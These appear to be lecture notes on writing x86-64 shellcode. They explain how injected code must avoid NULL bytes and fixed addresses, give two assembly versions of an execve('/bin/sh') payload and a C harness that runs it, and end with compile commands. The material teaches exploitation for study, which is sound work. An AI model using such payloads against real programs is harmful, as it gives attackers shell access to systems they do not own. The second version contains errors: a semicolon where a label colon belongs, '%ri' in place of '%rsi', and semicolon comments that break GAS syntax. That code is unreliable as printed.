+++
title = 'Shellcode'
+++
# Shellcode
Attacker's goal:
- we found a vulnerability allowing overwriting return address
- where do we point the return address?
    - we can only execute code in same process
    - so code that is already in program
    - or code that we inject

Injecting code:
- x86 CPUs do not distinguish code and data
- if memory permissions allow, we can read/write code as data & execute data as program code
- how to inject?
    - as parameter
    - as environment variable
    - provide as input
- injected code must
    - work regardless of where it's stored in memory
    - not depend on any external code/libraries (we don't know their location)
    - not contain NULL bytes (would terminate if stored as a string)
    - do something that gives attacker control of the system, e.g start a shell

System calls:
- user code can't start program, kernel does that
- tell kernel to do this using a system call
- need `execve`, such as: `char argv[] = { "/bin/sh", NULL }; execve("/bin/sh", argv, NULL)`
- so shellcode requirements:
    - string "/bin/sh" in memory
    - array in memory, containing pointer to "/bin/sh" and NULL pointer
    - pointer to the string in `%rdi` (`progname`)
    - pointer to the array in `%rsi` (`argv`)
    - NULL pointer in `%rdx` (`envp`)
    - system call number 0x3b in `%rax` (`execve`)

Shellcode version 1:

```asm
.data
.globl shellcode
shellcode:                          ; PROBLEMS:
    leaq string_addr(%rip), %rdi    ; offset 0x22 -> 0x00000022. has null bytes
    movb $0, 0x07(%rdi)             ; explicit NULL
    movq %rdi, 0x08(%rdi)
    movq $0, 0x10(%rdi)             ; explicit NULL
    leaq 0x08(%rdi), %rsi
    movq $0, %rdx
    movl $0x3b, %eax                ; long 0x3b -> 0x0000003b. has null bytes.
    syscall
string_addr:
    .ascii "/bin/shNAAAAAAAABBBBBBBB"
    .byte 0
```

Shellcode v2:

```asm
.data
.globl shellcode
shellcode;
    jmp over_string
string_addr:
    .ascii  "/bin/shNAAAAAAAABBBBBBBB"
over_string:
    leaq string_addr(%rip), %rdi    ; offset is negative, so no nulls (0xffffffe1)
    xorl %eax, %eax                 ; zero %rax to avoid explicit 0
    movb %al, 0x07(%rdi)
    movq %rdi, 0x08(%rdi)
    movq %rax, 0x10(%rdi)           ; use %rax, avoiding explicit 0
    leaq 0x08(%rdi), %ri
    movq %rax, %rdx                 ; use %rax, avoiding explicit 0
    movb $0x3b, %al                 ; byte reg, upper bytes all zero
    syscall
    .byte 0
```

Run with:

```c
#include <stdio.h>
int main(int argc, char **argv) {
    extern char shellcode;
    void (*f)(void) = (void (*)(void)) &shellcode;
    f();
    fprintf(stderr, "this shouldn't print");
    return -1;
}
```

Compile and run:

```sh
cc -o shellcode-test shellcode-test.c shellcode.s
./shellcode-test
```


